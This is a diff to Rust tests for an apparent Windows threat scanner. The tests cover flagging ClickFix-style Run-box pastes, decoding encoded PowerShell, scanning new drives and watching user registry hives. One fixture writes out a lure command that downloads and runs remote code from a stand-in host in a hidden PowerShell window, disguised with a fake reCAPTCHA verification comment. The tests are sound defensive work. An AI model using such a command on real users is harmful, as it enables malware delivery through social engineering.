@@ -385,18 +385,18 @@ fn run_box_commands_are_checked_and_hidden_scripts_scanned() {
     let ctx = Ctx { engine: &engine, data_dir: tmp.path(), config: &config, stop: &stop, halt: AtomicBool::new(false), cache: &cache, commands: &recent, excluded: &[], events: &events };
 
     let pasted = r#"powershell -w hidden -c "iex(irm https://x.test/v)" # I am not a robot - reCAPTCHA Verification ID: 4821"#;
-    let hit = commands::check_run_box(&ctx, pasted).unwrap();
+    let hit = commands::check_run_box(&ctx, pasted, None).unwrap();
     let rules: Vec<&str> = hit.matches.iter().map(|m| m.rule.as_str()).collect();
     assert_eq!(rules[0], "clickfix.run-box");
     assert!(rules.contains(&"clickfix.decoy") && rules.contains(&"powershell.download-run"), "{rules:?}");
     assert_eq!(hit.confidence(), crate::cmdline::Confidence::High);
-    assert!(commands::check_run_box(&ctx, "notepad").is_none());
-    assert!(commands::check_run_box(&ctx, "cmd").is_none());
-    assert!(commands::check_run_box(&ctx, "powershell").is_none());
+    assert!(commands::check_run_box(&ctx, "notepad", None).is_none());
+    assert!(commands::check_run_box(&ctx, "cmd", None).is_none());
+    assert!(commands::check_run_box(&ctx, "powershell", None).is_none());
 
     // The decoded script goes through the signatures.
     let payload = crate::system::encode_powershell(&format!("Write-Output '{}'", marker()));
-    let hit = commands::check_run_box(&ctx, &format!("powershell -enc {payload}")).unwrap();
+    let hit = commands::check_run_box(&ctx, &format!("powershell -enc {payload}"), None).unwrap();
     assert!(hit.matches.iter().any(|m| m.rule == "signature.Test.ThreatScanner.Marker"), "{:?}", hit.matches);
     assert_eq!(hit.script.as_deref(), Some(format!("Write-Output '{}'", marker()).as_str()));
 }
@@ -416,8 +416,8 @@ fn only_confident_commands_are_kept_and_repeats_are_collapsed() {
     let ctx = Ctx { engine: &engine, data_dir: tmp.path(), config: &config, stop: &stop, halt: AtomicBool::new(false), cache: &cache, commands: &recent, excluded: &[], events: &events };
     let store = scan::open_store(tmp.path()).unwrap();
 
-    let high = commands::check_run_box(&ctx, "cmd /c ping -n 1 127.0.0.1 & rem I am not a robot - verification").unwrap();
-    let medium = commands::check_run_box(&ctx, "powershell -NoProfile -w hidden -c Start-Sleep 1").unwrap();
+    let high = commands::check_run_box(&ctx, "cmd /c ping -n 1 127.0.0.1 & rem I am not a robot - verification", None).unwrap();
+    let medium = commands::check_run_box(&ctx, "powershell -NoProfile -w hidden -c Start-Sleep 1", None).unwrap();
     // The Run box makes anything high; a program match alone can be medium.
     let medium = CommandHit { source: CommandSource::Program, matches: medium.matches.into_iter().filter(|m| m.rule != "clickfix.run-box").collect(), ..medium };
     assert!(high.in_history() && !medium.in_history());
@@ -477,7 +477,9 @@ fn a_new_drive_is_checked_when_it_appears() {
     cfg.defer_when_fullscreen = false;
     let mut run = Run::start(&tmp.path().join("data"), cfg);
     assert!(run.until(|m| m.starts_with("started")));
-    std::thread::sleep(Duration::from_millis(500));
+    // The drive monitor's first list of drives is what counts as already
+    // there; wait a full poll so this drive is not taken for one of them.
+    std::thread::sleep(Duration::from_millis(2500));
 
     // Like double-clicking an ISO: a new drive letter appears.
     let Some(drive) = Subst::new(&image) else { return };
@@ -487,4 +489,31 @@ fn a_new_drive_is_checked_when_it_appears() {
     run.handle.stop();
     assert!(run.seen.contains(&format!("drive {root} 2")), "{:?}", run.seen);
     assert!(found, "{:?}", run.seen);
+}
+
+#[cfg(windows)]
+#[test]
+fn every_signed_in_persons_hive_is_watched_and_nothing_else() {
+    for (name, person) in [
+        ("S-1-5-21-1004336348-1177238915-682003330-1001", true),
+        ("S-1-5-21-1004336348-1177238915-682003330-1001_Classes", false),
+        ("S-1-5-18", false),
+        ("S-1-5-19", false),
+        (".DEFAULT", false),
+    ] {
+        assert_eq!(commands::is_user_hive(name), person, "{name}");
+    }
+}
+
+#[cfg(windows)]
+#[test]
+fn the_run_box_view_finds_this_user() {
+    // whoami /user /fo csv /nh → "desktop\me","S-1-5-21-…"
+    let out = std::process::Command::new("whoami").args(["/user", "/fo", "csv", "/nh"]).output().unwrap();
+    let text = String::from_utf8_lossy(&out.stdout);
+    let sid = text.trim().rsplit(',').next().unwrap().trim_matches('"').to_string();
+    let view = commands::run_box_view();
+    let mine = view.hives.iter().find(|h| h.name == sid).unwrap_or_else(|| panic!("{sid} not in {:?}", view.hives.iter().map(|h| &h.name).collect::<Vec<_>>()));
+    assert!(mine.person);
+    assert!(mine.run_box.is_ok() || mine.run_box.as_ref().err().is_some_and(|e| e.contains("cannot find")), "{:?}", mine.run_box);
 }
